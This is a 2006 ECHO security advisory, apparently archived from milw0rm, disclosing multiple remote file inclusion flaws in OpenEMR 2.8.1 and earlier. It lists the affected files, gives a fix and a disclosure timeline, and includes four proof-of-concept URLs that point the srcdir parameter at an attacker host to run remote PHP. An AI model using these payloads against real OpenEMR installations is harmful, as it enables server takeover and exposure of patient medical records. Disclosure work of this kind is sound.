@@ -1,0 +1,127 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \
+ |    __)_ /    \  \//    ~    \/   |   \
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/                              .OR.ID
+ECHO_ADV_60$2006
+
+-----------------------------------------------------------------------------------------------
+[ECHO_ADV_60$2006] OpenEMR <=2.8.1 Multiple Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------------
+
+Author		: Dedi Dwianto a.k.a the_day
+Date Found	: November, 01nd 2006
+Location	: Indonesia, Jakarta
+web		: http://advisories.echo.or.id/adv/adv60-theday-2006.txt
+Critical Lvl	: Highly critical
+Impact		: System access
+Where		: From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application	: OpenEMR
+version		: <=2.8.1
+URL		: http://www.oemr.org
+
+OpenEMR is Open Source electronic medical record and medical practice management software. 
+OpenEMR is best described as a "system" of programs. The main OpenEMR program consists of the electronic
+health records and scheduling software. 
+OpenEMR can also be configured for insurance billing with FreeB, accounting with SQL-Ledger,
+and access controls with php-GACL.
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~~
+
+I found vulnerability in interface/billing/billing_process.php
+-----------------------interface/billing/billing_process.php-------------
+....
+<?
+...
+include_once("$srcdir/patient.inc");
+include_once("$srcdir/billrep.inc");
+...
+----------------------------------------------------------
+
+Input passed to the "$srcdir" parameter in billing_process.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+
+Also affected files :
+
+interface/billing/billing_report.php
+interface/billing/billing_report_xml.php
+interface/billing/print_billing_report.php
+login.php
+interface/batchcom/batchcom.php
+interface/login/login.php
+interface/main/main_info.php
+interface/main/main.php
+interface/new/new_patient_save.php
+interface/practice/ins_search.php
+interface/logout.php
+interface/reports/custom_report_range.php
+interface/reports/players_report.php
+interface/reports/front_receipts_report.php
+interface/usergroup/facility_admin.php
+interface/usergroup/usergroup_admin.php
+interface/usergroup/user_info.php
+interface/usergroup/facility_admin.php
+interface/usergroup/facility_admin.php
+custom/import_xml.php
+
+New Vulnerability in OpenEMR Version 2.8.1
+----library/translation.inc.php----
+<?
+....
+include_once($GLOBALS['srcdir'] . '/sql.inc');
+....
+?>
+
+Proof Of Concept:
+~~~~~~~~~~~~~~~
+
+http://target.com/[OpenEMR-path]/interface/billing/billing_process.php?srcdir=http://atacker.com/inject.txt?
+http://target.com/[OpenEMR-path]/interface/new/new_patient_save.php?srcdir=http://atacker.com/inject.txt?
+http://target.com/[OpenEMR-path]/login.php?srcdir=http://atacker.com/inject.txt?
+http://target.com/[OpenEMR-path]/library/translation.inc.php?GLOBALS[srcdir]=http://atacker.com/inject.txt?
+
+
+
+Solution:
+~~~~~~~
+
+- Sanitize variable $srcdir affected files.
+- Turn off register_globals
+
+Timeline :
+~~~~~~~~~
+
+01 - 11 - 2006 bugs found
+01 - 11 - 2006 vendor contacted
+07 - 11 - 2006 public disclosure
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~
+~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous
+~ Jessy My Brain
+~ az001,bomm_3x,matdhule,angelia
+~ newbie_hacker@yahoogroups.com
+~ #aikmel - #e-c-h-o @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~~~~
+     EcHo Research & Development Center
+     the_day[at]echo[dot]or[dot]id
+     
+-------------------------------- [ EOF ]----------------------------------
+
+# milw0rm.com [2006-11-06]
